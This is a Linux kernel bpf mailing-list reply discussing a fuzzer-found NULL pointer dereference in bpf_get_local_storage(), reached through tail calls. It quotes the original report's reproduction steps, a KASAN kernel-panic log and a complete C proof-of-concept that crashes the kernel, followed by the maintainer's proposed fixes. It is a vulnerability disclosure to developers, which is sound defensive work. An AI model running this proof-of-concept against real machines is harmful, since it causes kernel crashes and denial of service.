Return-Path: <bpf+bounces-75397-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [IPv6:2605:f480:58:1:0:1994:3:14])
	by mail.lfdr.de (Postfix) with ESMTPS id EEEEDC82BCE
	for <lists+bpf@lfdr.de>; Mon, 24 Nov 2025 23:48:42 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id 2BF344E6F57
	for <lists+bpf@lfdr.de>; Mon, 24 Nov 2025 22:46:07 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 303F22749DC;
	Mon, 24 Nov 2025 22:46:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="cbs/muNz"
X-Original-To: bpf@vger.kernel.org
Received: from mail-yw1-f169.google.com (mail-yw1-f169.google.com [209.85.128.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A3A2926F46E
	for <bpf@vger.kernel.org>; Mon, 24 Nov 2025 22:46:00 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1764024362; cv=none; b=bqusLLsxf14maaaQYglumzNHCRKZ25gRi+mz50zQi0Q9M0vXIrtjuDhUkDmOip2VyXGygtdOhzFsuRWHN33NpVcE9G1eYa56CAJE6Wf23526NpAqG9QJOD+P+k+JlapQX/gUdl3E5LSz0GRF1Os5ush2oa/AgiJ0MpDxukz0W10=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1764024362; c=relaxed/simple;
	bh=mnh08nE5e8YTDnFH3g2UmNKa6VOkjvD6qWARwcombMo=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=N911ei56+bNjwcyAhCGpDslv2SXLU11JivoHzd7X5hYW0h50hslDUgcyVq4Og0VGepl8RRM23oJ3phHLn6ztThMJNqAmAu5ymXZ2LIn1I6TzE1bUiIEOVyk7Pk95PyJQ8Uvi2B/BUaLciFs/0Omb4mA+RnQQHl6ng54LOV/MCvs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=cbs/muNz; arc=none smtp.client-ip=209.85.128.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-yw1-f169.google.com with SMTP id 00721157ae682-78ab039ddb4so11030127b3.3
        for <bpf@vger.kernel.org>; Mon, 24 Nov 2025 14:46:00 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1764024359; x=1764629159; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=XIWMKLEyf45WR6yIuueKinH3HiSrSCDqqNm/MEAFBt4=;
        b=cbs/muNzIbVpQp0anzmyhqPEbORzQJLHHqOkimxlbpo3jRyrMJlD/4Z8qEmJjR8r9l
         Up6PzYganU2fvHjMDWbaxjjVOPmmMwp1CotFnU0A0Tngq2Jn+jPcCUgp3JgfcqaO5Mbp
         hoCzBZcAOKtuPVISpCPqB2mFl46u3gqyDAw4Xxs7lP3pFH5TOQdOpQHp2+GHUfcS4zz4
         Q+vuaOnlzEbLBRv4kcJdTpAQnVhHUt6c2dUlOSKVLx3qhrWRA4MFgyT3yqGVJjUkRHgg
         vnUJMRZIXH671ChdXF04+J+jT8m7y/vtkhi8b+Iyo/qcfEociK0CMKkQps/hREIT6C89
         bsAw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1764024359; x=1764629159;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=XIWMKLEyf45WR6yIuueKinH3HiSrSCDqqNm/MEAFBt4=;
        b=DfBpqbHLp9KSM93n4VBoWVnok1SuQMyhxK7zirAajfEGOjir0oXgb10OsqzTUYT3hg
         I0MV5OzC1jBaxMuMx+EJdaAg1PqnW01/ah+x2TDZP7Goi6ZKPseKD0OHc3TkYPkxmE6j
         X0fdAzm7NkavdiP9F4uDPAJWooyPOPoe9HA8Um1d0T8yJcSYmubDsVQcNVlNN3rDTSJ5
         53I0SPzxgpS1n2Rvi1oYLXlI+4at1/7yFbTJxOTSQJndQI4oJHMK8J8DvOb39Da3QucO
         PXy8+i7afLRWZ3jZ3bZZnz8NOO+PIrF5rV/Fb3E1CiVm5dSzrruCc/ZjM27B2uxzfcva
         akDQ==
X-Forwarded-Encrypted: i=1; AJvYcCWb6imHtXhghZ86tS4QY+kRzG6AtzTe3s8fz/gxBtaAxsgLzEwhwpK1MkEXSfd5XK4VnVo=@vger.kernel.org
X-Gm-Message-State: AOJu0YymYlxB70KyWm3fL8MO9mL5yzOZgsq24+W6d9XExQgIWdElXQKp
	FEv+HKHuSHNiXAX+rVcEJhQq+k8iLy5s+zkpDwdKugs91eFAsUPnOmaLeqsVviy3m+8GPYdDZNs
	fvcxYUdSSiOdVknj8GFt4RCOs4l40svE=
X-Gm-Gg: ASbGncsM27tNCq279VsM7nmjKaMTXArvgsHKdc+1LdRZQLCGzjsibYW39pxpQU9GFWA
	EHWUkO04iNqoPqcjaDjWLALW/hMb0OxjK5lbEFdd94RfuN3Rzp2ks9na8IOOleAocwQimbLuwmT
	XjzANRR7mf9HVcZiaTADhy3Lju0+3hDz3Wzorgw0PE+gKwUYTERQwQQZXWx5Ngzsl62kciCHti7
	Noq8NfJXC9C62LmnCoX4R/GC8TuW+QjnI4k3Oa4LgzwyL7pif2bMja4oBqVRDM1HmxGvcfoN/Sa
	3gmYbA==
X-Google-Smtp-Source: AGHT+IF+JIk+AQDtJb0DEwn3T+JcNOwC9SOXbKgG4Wn9lPXutLcsox+S+k0FQPoIXYGwiHDPN3boXchuHNLktU9Q5mY=
X-Received: by 2002:a05:690c:46c9:b0:786:9774:a39f with SMTP id
 00721157ae682-78a8b47a894mr99283737b3.5.1764024359427; Mon, 24 Nov 2025
 14:45:59 -0800 (PST)
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <c9ac63d7-73be-49c5-a4ac-eb07f7521adb@hust.edu.cn> <CAMB2axMN2mMy=mHjtprd=HN-5enmwX=VSPUdM051V=fgFtjKWg@mail.gmail.com>
In-Reply-To: <CAMB2axMN2mMy=mHjtprd=HN-5enmwX=VSPUdM051V=fgFtjKWg@mail.gmail.com>
From: Amery Hung <ameryhung@gmail.com>
Date: Mon, 24 Nov 2025 14:45:48 -0800
X-Gm-Features: AWmQ_bkT0B0Gmho5Bq4jctmlPgIwKDsuR-r4utV5HytqSG4rGe011g0BFvRxTEU
Message-ID: <CAMB2axMvR2nRKCKmRg72fmWpRuJyv=_SiFPaOPZayhR59zgaqw@mail.gmail.com>
Subject: Re: GPF in bpf_get_local_storage due to missing cgroup storage check
 in tail calls
To: Yinhao Hu <dddddd@hust.edu.cn>
Cc: Daniel Borkmann <daniel@iogearbox.net>, bpf <bpf@vger.kernel.org>, dzm91@hust.edu.cn, 
	M202472210@hust.edu.cn, martin.lau@linux.dev, 
	Alexei Starovoitov <ast@kernel.org>, Andrii Nakryiko <andrii@kernel.org>, 
	hust-os-kernel-patches@googlegroups.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Mon, Nov 24, 2025 at 12:47=E2=80=AFPM Amery Hung <ameryhung@gmail.com> w=
rote:
>
> On Mon, Nov 24, 2025 at 1:19=E2=80=AFAM Yinhao Hu <dddddd@hust.edu.cn> wr=
ote:
> >
> > Our fuzzer tool discovered a NULL pointer dereference in the
> > `bpf_get_local_storage()` helper function. This issue can lead to a
> > general protection fault when executing specific BPF program sequences
> > involving tail calls and Cgroup Local Storage. The verification process
> > for `BPF_MAP_TYPE_PROG_ARRAY` ensures that the Callee is compatible wit=
h
> > the map, but it fails to strictly enforce that the Caller has allocated
> > the necessary Cgroup Storage resources required by the Callee. If a
> > Caller (which does not use Cgroup Storage) tail calls into a Callee
> > (which does use `BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE`), the Callee runs
> > in a context where the storage pointer is `NULL`. The
> > `bpf_get_local_storage()` helper in the Callee attempts to dereference
> > this `NULL` storage pointer, causing a crash.
> >
> > By manipulating the `BPF_MAP_TYPE_PROG_ARRAY` ownership (assigning it
> > first to a program that does use storage), we can bypass the initial
> > compatibility checks and insert a storage-using program into the array,
> > which can then be invoked by a non-storage-using Caller.
> >
> > Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> > Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> > Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
> >
> > ## Reproduction Steps
> >
> > 1.  Setup: Create a `BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE` map and a
> > `BPF_MAP_TYPE_PROG_ARRAY` map.
> > 2.  Establish Owner: Load a dummy "Owner" program (Prog C) that
> > references both maps. This sets the `PROG_ARRAY`'s owner attributes to
> > expect storage usage.
> > 3.  Load Callee: Load the target program (Prog B) that uses the storage
> > map and calls `bpf_get_local_storage()`.
> > 4.  Load Caller: Load the malicious caller program (Prog A) that uses
> > the `PROG_ARRAY` but not the storage map. The verifier allows this due
> > to a permissive check on tail call compatibility.
> > 5.  Update Map: Insert Prog B into the `PROG_ARRAY`.
> > 6.  Trigger: Execute Prog A via `BPF_PROG_TEST_RUN`. It tail calls into
> > Prog B, which crashes upon accessing the missing storage.
> >
> > ## KASAN Report
> >
> > The following C program should demonstrate the vulnerability on
> > linux-next 6.18.0-rc6-next-20251121:
>
> Thanks for reporting. I tested the POC on bpf-next and can still reproduc=
e.
>
> I took a brief look at the cgroup local storage code. The problem
> seems to be bpf_get_local_storage() not checking if a cgroup local
> storage is created. A cgroup local storage is created on program
> attachment (prog A), which never happens. Then a tail call into prog B
> deference the not-allocated-yet storage.
>
> Just thinking out loud. Maybe a if (storage) check before
> dereferencing would be enough? Also need to look more to see if there
> are other ways to trigger this type of bug.

Looking at the problem a bit more. Here are several solutions that I
can think of.

(1) Adding a "if (!storage) return NULL;" check.
CONS: It will change the helper from RET_PTR_TO_MAP_VALUE to
RET_PTR_TO_MAP_VALUE_OR_NULL, which will break UAPI.

(2) Adding a runtime check to disallow tail calls from a program that
does not use cgroup local storage to a program that does.
CONS: Add overhead to all tail calls.

(3) Allocating and linking cgroup local storage when updating
prog_array map if the program is using one.
Probably the most reasonable fix among the three.

>
> >
> > ```
> > [   87.795255] Oops: general protection fault, probably for
> > non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
> > [   87.796199] KASAN: null-ptr-deref in range
> > [0x0000000000000000-0x0000000000000007]
> > [   87.796952] CPU: 0 UID: 0 PID: 350 Comm: poc Not tainted
> > 6.18.0-rc6-next-20251121 #9 PREEMPT(none)
> > [   87.797863] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX,
> > 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> > [   87.798828] RIP: 0010:bpf_get_local_storage+0x106/0x1c0
> > [   87.799403] Code: 48 8d 7b 10 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85
> > 9d 00 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b 5b 10 48 89 da 48 c1 ea
> > 03 <80> 3c 02 00 0f 85 88 00 00 00 48 8b 1b e8 58 8c b5 03 89 c5 3d ff
> > [   87.801321] RSP: 0018:ffff8881042675b8 EFLAGS: 00010256
> > [   87.801860] RAX: dffffc0000000000 RBX: 0000000000000000 RCX:
> > 1ffffffff1359c34
> > [   87.802583] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
> > ffff888104267700
> > [   87.803356] RBP: 0000000000000015 R08: 0000000000000001 R09:
> > 0000000000000000
> > [   87.804074] R10: ffff888113aaf000 R11: ffff888113aaf0bc R12:
> > ffff888104267930
> > [   87.804816] R13: ffffc900005c7000 R14: ffff888104267730 R15:
> > ffffed10227ea641
> > [   87.805563] FS:  0000000029cbc380(0000) GS:ffff8881911ff000(0000)
> > knlGS:0000000000000000
> > [   87.806467] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> > [   87.807080] CR2: 00000000004a0000 CR3: 000000010317f000 CR4:
> > 0000000000750ef0
> > [   87.807852] PKRU: 55555554
> > [   87.808150] Call Trace:
> > [   87.808447]  <TASK>
> > [   87.808703]  bpf_prog_09b98cd0bcd009a1+0x1d/0x28
> > [   87.809209]  bpf_test_run+0x47b/0xcd0
> > [   87.809620]  ? __pfx_bpf_test_run+0x10/0x10
> > [   87.810086]  ? check_bytes_and_report+0xd0/0x150
> > [   87.811109]  ? __asan_memset+0x1f/0x40
> > [   87.811544]  bpf_prog_test_run_skb+0xea9/0x3570
> > [   87.812059]  ? __pfx_bpf_prog_test_run_skb+0x10/0x10
> > [   87.813150]  ? __pfx_bpf_check_uarg_tail_zero+0x10/0x10
> > [   87.813733]  __sys_bpf+0xac0/0x5110
> > [   87.814123]  ? __pfx___sys_bpf+0x10/0x10
> > [   87.815056]  ? kfree+0x19b/0x510
> > [   87.815931]  ? __sys_bpf+0x2ca1/0x5110
> > [   87.816906]  ? __sys_bpf+0x1b2f/0x5110
> > [   87.817316]  ? __pfx___sys_bpf+0x10/0x10
> > [   87.818752]  __x64_sys_bpf+0x74/0xc0
> > [   87.819134]  do_syscall_64+0x76/0x4e0
> > [   87.820630]  ? do_syscall_64+0xa2/0x4e0
> > [   87.821606]  ? do_syscall_64+0x24c/0x4e0
> > [   87.822558]  ? switch_fpu_return+0xf6/0x200
> > [   87.823570]  ? do_syscall_64+0x24c/0x4e0
> > [   87.824039]  ? handle_mm_fault+0x1ab/0x900
> > [   87.824518]  ? lock_mm_and_find_vma+0x58/0x720
> > [   87.825562]  ? do_user_addr_fault+0x863/0xf40
> > [   87.826595]  ? irqentry_exit+0x54/0x6a0
> > [   87.827025]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
> > [   87.827716] RIP: 0033:0x41233d
> > [   87.828074] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa
> > 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f
> > 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
> > [   87.830029] RSP: 002b:00007fffbf5d6be8 EFLAGS: 00000206 ORIG_RAX:
> > 0000000000000141
> > [   87.830840] RAX: ffffffffffffffda RBX: 0000000000000001 RCX:
> > 000000000041233d
> > [   87.831604] RDX: 0000000000000090 RSI: 00007fffbf5d6cd0 RDI:
> > 000000000000000a
> > [   87.832367] RBP: 00007fffbf5d6c00 R08: 00007fffbf5d6cd0 R09:
> > 00007fffbf5d6cd0
> > [   87.833149] R10: 00007fffbf5d6cd0 R11: 0000000000000206 R12:
> > 00007fffbf5d7f08
> > [   87.833975] R13: 00007fffbf5d7f18 R14: 00000000004a5f68 R15:
> > 0000000000000001
> > [   87.834744]  </TASK>
> > [   87.835012] Modules linked in:
> > [   87.835450] ---[ end trace 0000000000000000 ]---
> > [   87.835917] RIP: 0010:bpf_get_local_storage+0x106/0x1c0
> > [   87.836462] Code: 48 8d 7b 10 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85
> > 9d 00 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b 5b 10 48 89 da 48 c1 ea
> > 03 <80> 3c 02 00 0f 85 88 00 00 00 48 8b 1b e8 58 8c b5 03 89 c5 3d ff
> > [   87.838321] RSP: 0018:ffff8881042675b8 EFLAGS: 00010256
> > [   87.838884] RAX: dffffc0000000000 RBX: 0000000000000000 RCX:
> > 1ffffffff1359c34
> > [   87.839671] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
> > ffff888104267700
> > [   87.840415] RBP: 0000000000000015 R08: 0000000000000001 R09:
> > 0000000000000000
> > [   87.841143] R10: ffff888113aaf000 R11: ffff888113aaf0bc R12:
> > ffff888104267930
> > [   87.841934] R13: ffffc900005c7000 R14: ffff888104267730 R15:
> > ffffed10227ea641
> > [   87.842713] FS:  0000000029cbc380(0000) GS:ffff8881911ff000(0000)
> > knlGS:0000000000000000
> > [   87.843547] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> > [   87.844138] CR2: 00000000004a0000 CR3: 000000010317f000 CR4:
> > 0000000000750ef0
> > [   87.844877] PKRU: 55555554
> > [   87.845181] Kernel panic - not syncing: Fatal exception in interrupt
> > [   87.845984] Kernel Offset: disabled
> > [   87.846339] ---[ end Kernel panic - not syncing: Fatal exception in
> > interrupt ]---
> > ```
> >
> > ## Proof of Concept
> >
> > ```c
> > #define _GNU_SOURCE
> > #include <stdio.h>
> > #include <unistd.h>
> > #include <sys/syscall.h>
> > #include <linux/bpf.h>
> > #include <string.h>
> > #include <errno.h>
> >
> > #ifndef __NR_bpf
> > #define __NR_bpf 321
> > #endif
> >
> > #define BPF_MOV64_IMM(DST, IMM) \
> >         ((struct bpf_insn){.code =3D BPF_ALU64 | BPF_MOV | BPF_K, .dst_=
reg =3D DST,
> > .imm =3D IMM})
> >
> > #define BPF_LD_MAP_FD(DST, MAP_FD) \
> >         ((struct bpf_insn){.code =3D BPF_LD | BPF_DW | BPF_IMM, .dst_re=
g =3D DST,
> > .src_reg =3D BPF_PSEUDO_MAP_FD, .imm =3D MAP_FD}), \
> >         ((struct bpf_insn){.code =3D 0, .imm =3D 0})
> >
> > #define BPF_CALL_FUNC(FUNC) \
> >         ((struct bpf_insn){.code =3D BPF_JMP | BPF_CALL, .imm =3D FUNC}=
)
> >
> > #define BPF_EXIT_INSN() \
> >         ((struct bpf_insn){.code =3D BPF_JMP | BPF_EXIT})
> >
> > static inline int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr,
> > unsigned int size) {
> >         return syscall(__NR_bpf, cmd, attr, size);
> > }
> >
> > int main(void) {
> >         union bpf_attr attr =3D {};
> >         char log_buf[4096];
> >         int storage_map, prog_array, prog_a, prog_b, prog_c;
> >
> >         // 1.1 Create Per-CPU Cgroup Storage Map
> >         struct { __u64 cgroup_inode_id; __u32 attach_type; } key =3D {}=
;
> >         attr.map_type =3D BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE;
> >         attr.key_size =3D sizeof(key);
> >         attr.value_size =3D 8;
> >         storage_map =3D sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
> >         if (storage_map < 0) return 1;
> >
> >         // 1.2 Create Prog Array
> >         memset(&attr, 0, sizeof(attr));
> >         attr.map_type =3D BPF_MAP_TYPE_PROG_ARRAY;
> >         attr.key_size =3D 4;
> >         attr.value_size =3D 4;
> >         attr.max_entries =3D 1;
> >         prog_array =3D sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
> >         if (prog_array < 0) return 1;
> >
> >         // 2. Load Prog C (Dummy Owner)
> >         struct bpf_insn insns_c[] =3D {
> >                 BPF_LD_MAP_FD(BPF_REG_1, storage_map),
> >                 BPF_LD_MAP_FD(BPF_REG_2, prog_array),
> >                 BPF_MOV64_IMM(BPF_REG_0, 1),
> >                 BPF_EXIT_INSN(),
> >         };
> >         memset(&attr, 0, sizeof(attr));
> >         attr.prog_type =3D BPF_PROG_TYPE_CGROUP_SKB;
> >         attr.insns =3D (unsigned long)insns_c;
> >         attr.insn_cnt =3D sizeof(insns_c) / sizeof(struct bpf_insn);
> >         attr.license =3D (unsigned long)"GPL";
> >         prog_c =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
> >         if (prog_c < 0) return 1;
> >
> >         // 3. Load Prog B (Callee)
> >         struct bpf_insn insns_b[] =3D {
> >                 BPF_LD_MAP_FD(BPF_REG_1, storage_map),
> >                 BPF_MOV64_IMM(BPF_REG_2, 0),
> >                 BPF_CALL_FUNC(BPF_FUNC_get_local_storage),
> >                 BPF_MOV64_IMM(BPF_REG_0, 1),
> >                 BPF_EXIT_INSN(),
> >         };
> >         attr.insns =3D (unsigned long)insns_b;
> >         attr.insn_cnt =3D sizeof(insns_b) / sizeof(struct bpf_insn);
> >         attr.log_buf =3D (unsigned long)log_buf;
> >         attr.log_size =3D sizeof(log_buf);
> >         attr.log_level =3D 1;
> >         prog_b =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
> >         if (prog_b < 0) return 1;
> >
> >         // 4. Load Prog A (Caller)
> >         struct bpf_insn insns_a[] =3D {
> >                 BPF_LD_MAP_FD(BPF_REG_2, prog_array),
> >                 BPF_MOV64_IMM(BPF_REG_3, 0),
> >                 BPF_CALL_FUNC(BPF_FUNC_tail_call),
> >                 BPF_MOV64_IMM(BPF_REG_0, 1),
> >                 BPF_EXIT_INSN(),
> >         };
> >         attr.insns =3D (unsigned long)insns_a;
> >         attr.insn_cnt =3D sizeof(insns_a) / sizeof(struct bpf_insn);
> >         prog_a =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
> >         if (prog_a < 0) return 1;
> >
> >         // 5. Update Prog Array
> >         int key_0 =3D 0;
> >         memset(&attr, 0, sizeof(attr));
> >         attr.map_fd =3D prog_array;
> >         attr.key =3D (unsigned long)&key_0;
> >         attr.value =3D (unsigned long)&prog_b;
> >         if (sys_bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)) < 0) retu=
rn 1;
> >
> >         // 6. Run Program A
> >         char data[128] =3D {};
> >         memset(&attr, 0, sizeof(attr));
> >         attr.test.prog_fd =3D prog_a;
> >         attr.test.data_in =3D (unsigned long)data;
> >         attr.test.data_size_in =3D sizeof(data);
> >         attr.test.repeat =3D 1;
> >         sys_bpf(BPF_PROG_TEST_RUN, &attr, sizeof(attr));
> >
> >         return 0;
> > }
> > ```

